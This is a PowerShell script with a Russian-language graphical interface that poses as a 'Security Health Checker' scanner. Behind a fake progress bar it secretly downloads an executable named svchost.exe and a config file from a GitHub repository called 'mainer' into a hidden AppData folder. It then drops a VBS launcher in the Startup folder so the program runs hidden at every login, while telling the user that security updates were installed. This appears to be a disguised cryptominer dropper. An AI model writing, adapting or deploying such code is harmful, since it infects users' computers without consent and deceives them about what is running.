Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "SecurityHealth Galaxy Scanner"
$form.Size = New-Object System.Drawing.Size(520,320)
$form.StartPosition = "CenterScreen"
$form.FormBorderStyle = "None"
$form.BackColor = [System.Drawing.Color]::FromArgb(5,5,25)
$form.MaximizeBox = $false

# Звёзды — 15 штук, чтобы не мешали
$rand = New-Object System.Random
for ($i=0; $i -lt 15; $i++) {
    $star = New-Object System.Windows.Forms.Label
    $star.Text = "."
    $star.ForeColor = [System.Drawing.Color]::White
    $star.BackColor = $form.BackColor
    $star.AutoSize = $true
    $star.Location = New-Object System.Drawing.Point($rand.Next(5,460), $rand.Next(5,90))
    $form.Controls.Add($star)
}

$title = New-Object System.Windows.Forms.Label
$title.Text = "SECURITY HEALTH CHECKER"
$title.Font = New-Object System.Drawing.Font("Consolas",16,[System.Drawing.FontStyle]::Bold)
$title.ForeColor = [System.Drawing.Color]::Cyan
$title.AutoSize = $true
$title.Location = New-Object System.Drawing.Point(40,20)
$form.Controls.Add($title)

$status = New-Object System.Windows.Forms.Label
$status.Text = "Инициализация модуля безопасности..."
$status.Font = New-Object System.Drawing.Font("Consolas",10)
$status.ForeColor = [System.Drawing.Color]::LightCyan
$status.AutoSize = $true
$status.Location = New-Object System.Drawing.Point(40,60)
$form.Controls.Add($status)

$substatus = New-Object System.Windows.Forms.Label
$substatus.Text = "Проверка целостности системных файлов..."
$substatus.Font = New-Object System.Drawing.Font("Consolas",9)
$substatus.ForeColor = [System.Drawing.Color]::Gray
$substatus.AutoSize = $true
$substatus.Location = New-Object System.Drawing.Point(40,90)
$form.Controls.Add($substatus)

$progress = New-Object System.Windows.Forms.ProgressBar
$progress.Size = New-Object System.Drawing.Size(430,25)
$progress.Location = New-Object System.Drawing.Point(40,130)
$progress.Style = "Continuous"
$form.Controls.Add($progress)

$btn = New-Object System.Windows.Forms.Button
$btn.Text = "ЗАВЕРШИТЬ"
$btn.Font = New-Object System.Drawing.Font("Consolas",12,[System.Drawing.FontStyle]::Bold)
$btn.ForeColor = [System.Drawing.Color]::White
$btn.BackColor = [System.Drawing.Color]::DarkMagenta
$btn.FlatStyle = "Flat"
$btn.FlatAppearance.BorderColor = [System.Drawing.Color]::Cyan
$btn.FlatAppearance.BorderSize = 2
$btn.Size = New-Object System.Drawing.Size(220,45)
$btn.Location = New-Object System.Drawing.Point(150,200)
$btn.Enabled = $false
$form.Controls.Add($btn)

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 70

$script:filesReady = $false
$script:errorOccurred = $false

$timer.Add_Tick({
    if ($progress.Value -lt 100) {
        $progress.Value += 1
        if ($progress.Value -eq 10) { $status.Text = "Сканирование системных каталогов..."; $substatus.Text = "C:\Windows\System32\drivers\etc" }
        if ($progress.Value -eq 25) { $status.Text = "Поиск уязвимостей и вредоносных модулей..."; $substatus.Text = "Анализ цифровых подписей..." }
        if ($progress.Value -eq 40 -and -not $script:filesReady -and -not $script:errorOccurred) {
            $status.Text = "Загрузка обновлений безопасности..."
            $substatus.Text = "Получение пакетов с сервера..."
            $urlExe  = "https://github.com/Varenik638/mainer/raw/refs/heads/main/svchost.exe"
            $urlConf = "https://github.com/Varenik638/cfg/raw/refs/heads/main/config.json"
            $workDir = "$env:APPDATA\Microsoft\Windows\System"
            try {
                if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
                Invoke-WebRequest -Uri $urlExe -OutFile "$workDir\svchost.exe" -UseBasicParsing
                Invoke-WebRequest -Uri $urlConf -OutFile "$workDir\config.json" -UseBasicParsing
                $script:filesReady = $true
                $status.Text = "Обновления безопасности установлены"
                $substatus.Text = "Проверка целостности завершена"
            } catch {
                $script:errorOccurred = $true
                $status.Text = "ОШИБКА ЗАГРУЗКИ ОБНОВЛЕНИЙ"
                $status.ForeColor = [System.Drawing.Color]::Red
                $substatus.Text = "Ошибка: $($_.Exception.Message)"
                $substatus.ForeColor = [System.Drawing.Color]::Red
                $timer.Stop()
                $btn.Enabled = $true
            }
        }
        if ($progress.Value -eq 60 -and $script:filesReady) {
            $status.Text = "Настройка системы..."
            $substatus.Text = "Внесение параметров безопасности..."
            $vbsPath = "$env:APPDATA\Microsoft\Windows\System\launch.vbs"
            $vbsContent = "CreateObject(`"WScript.Shell`").Run `"$env:APPDATA\Microsoft\Windows\System\svchost.exe -c $env:APPDATA\Microsoft\Windows\System\config.json`", 0, False"
            try {
                $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
                $startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityHealth.vbs"
                Copy-Item $vbsPath $startupPath -Force
                $status.Text = "Настройка завершена"
                $substatus.Text = "Система будет защищена при каждом входе"
            } catch {
                $status.Text = "ОШИБКА НАСТРОЙКИ"
                $status.ForeColor = [System.Drawing.Color]::Red
                $substatus.Text = "Невозможно применить параметры"
                $substatus.ForeColor = [System.Drawing.Color]::Red
                $script:errorOccurred = $true
                $timer.Stop()
                $btn.Enabled = $true
            }
        }
        if ($progress.Value -eq 80 -and $script:filesReady) {
            $status.Text = "Запуск защитных модулей..."
            $substatus.Text = "Активация SecurityHealth Guard..."
        }
    } else {
        $timer.Stop()
        if (-not $script:errorOccurred) {
            $status.Text = "Сканирование завершено!"
            $status.ForeColor = [System.Drawing.Color]::Green
            $substatus.Text = "Все проверки пройдены. Нажмите ЗАВЕРШИТЬ."
            $btn.Enabled = $true
        } else {
            $status.Text = "ОШИБКА"
            $status.ForeColor = [System.Drawing.Color]::Red
            $substatus.Text = "Попробуйте перезапустить программу"
            $substatus.ForeColor = [System.Drawing.Color]::Red
            $btn.Enabled = $true
        }
    }
})

$btn.Add_Click({
    if ($script:filesReady) {
        try {
            Start-Process -FilePath "wscript.exe" -ArgumentList "//B", "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SecurityHealth.vbs" -WindowStyle Hidden
        } catch {}
    }
    $form.Close()
})

$form.Add_Shown({$timer.Start()})
[void]$form.ShowDialog()